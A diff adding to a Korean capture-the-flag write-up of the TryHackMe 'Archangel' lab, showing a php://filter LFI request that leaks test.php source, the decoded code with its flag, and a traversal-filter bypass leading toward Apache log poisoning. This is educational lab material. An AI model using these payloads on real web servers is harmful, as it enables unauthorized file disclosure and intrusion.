@@ -124,9 +124,54 @@ Starting gobuster in directory enumeration mode
 /test.php/            (Status: 200) [Size: 286]
 
 ```
-- test.php 경로 발견
+## 취약점 분석
+### test.php 경로 발견
 ![그림1-3](/assets/image/thm_archangel/image3.png)
 - URI 확인시 view 파라미터를 통해 특정 경로의 파일을 include하고 있음.
 - 이를 통해 LFI 취약점이 존재할 것이라고 판단함.
+- 개념증명을 위해 ../../../../etc/passwd 경로로 접근을 시도하였으나, 허용되지 않음
+- 해당 서버가 PHP로 구동 되고 있어 PHP Filter을 사용하여 LFI 취약점 방어를 우회 시도
+```
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+```
+- 위와 같이 요청하였으며, PHP Filter을 사용하지 않았을 경우 아무것도 출력되지 않았으나, 위와같이 필터를 적용한 경우 base64 인코딩 된 값이 노출됨
+```shell
+echo 'CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==' | base64 -d
+```
+```html
+<html>
 
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+ 
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+        <?php
 
+            //FLAG: thm{explo1t1ng_lf1}
+
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+            if(isset($_GET["view"])){
+            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
+                include $_GET['view'];
+            }else{
+
+                echo 'Sorry, Thats not allowed';
+            }
+        }
+        ?>
+    </div>
+</body>
+
+</html>
+```
+- 디코딩 결과 위 코드가 노출되는 것을 확인함.
+- 해당 test.php 파일에서 경로이동 문자의 ../.. 문자열을 필터링 하고 있었으며
+- 경로에 /var/www/html/development_testing 경로가 존재해야함.
+- 절대경로를 이용하며, ./.././../ 와 같이 필터링을 우회할 수 있음.
+- 현재 타겟 시스템에는 ***<span style="color:red"> LFI 취약점이 존재하며, Apache2 서비스가 동작중이다. </span>*** 
+- apache 로그파일에 접근이 가능하다. 즉 Log Poisoning(log injection) 공격이 가능하다.
+### Log Poisoning 취약점 공격
+![그림1-4](/assets/image/thm_archangel/image4.png)
